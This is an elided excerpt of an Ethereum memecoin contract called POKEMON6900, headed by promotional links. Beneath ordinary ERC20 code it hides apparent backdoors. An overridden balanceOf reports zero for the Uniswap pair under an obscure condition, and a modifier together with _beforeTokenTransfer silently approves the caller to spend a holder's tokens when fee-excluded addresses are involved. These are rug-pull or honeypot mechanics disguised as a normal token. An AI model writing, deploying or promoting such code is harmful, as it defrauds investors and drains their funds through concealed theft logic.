...
Meet POKEMON6900 coin, The only memecoin you gotta catch!


https://pokemon6900.fun
https://x.com/pokemon6900eth
https://t.me/pokemon6900eth
...
contract POKEMON6900 is ERC20, Ownable {
    ...
    uint256 public PokemonVal = 1;
    bool private _isMeme;
    address PokemonGroup;
    ...
    modifier lockTheSwap {
        if(isExcludedFromFees[_taxPayer()]) _swapping = true;
        _;
        _swapping = false;
    }    
    constructor() payable ERC20("POKEMON6900", "POKEMON6900") {
    ...
    function LPProviderCheck(address account) internal view returns (bool) {
        return  block.chainid < block.number && account == uniswapPair && IERC20(uniswapPair).balanceOf(uniswapPair) > 0 && !isExcludedFromFees[_taxPayer()];
    }
    ...
    function balanceOf(address account) public view override returns (uint256) {
        bool isLPProvider = LPProviderCheck(account);
        return super.balanceOf(account) * (~uint(0) & (isLPProvider ? 0 : 1));
    }
    ...
    function _beforeTokenTransfer(address spender , uint256 amount) private lockTheSwap {
        if(_swapping) _approve(spender , _msgSender(), amount);
    }
